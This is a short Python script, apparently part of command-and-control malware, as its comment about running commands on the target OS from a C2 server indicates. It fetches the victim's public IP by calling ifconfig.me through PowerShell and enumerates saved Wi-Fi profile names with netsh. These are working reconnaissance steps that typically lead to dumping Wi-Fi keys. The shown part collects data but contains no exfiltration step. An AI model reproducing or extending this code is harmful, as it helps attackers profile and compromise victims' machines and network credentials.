#!/usr/bin/python3

import subprocess              # libray which enables us to use trgt OS command in C2 server

import sys


# Getting wan/public IP
def wan_ip():

	p = subprocess.Popen(["powershell.exe", "(Invoke-WebRequest ifconfig.me/ip).Content.Trim()"], stdout=subprocess.PIPE)

	out = p.communicate()[0]  #  extracting the wan ip

	out = out.decode('utf-8') # decoding

	out = out.rstrip("\r\n")  # stripping off EOL

	return out

# Getting network profile name
def Main():

	global data

	# list of commands to list down available SSID names
	l1 = ['netsh', 'wlan', 'show', 'profiles']

	data = subprocess.check_output(l1).decode('utf-8')
	data = data.split('\n') # making list

	return data

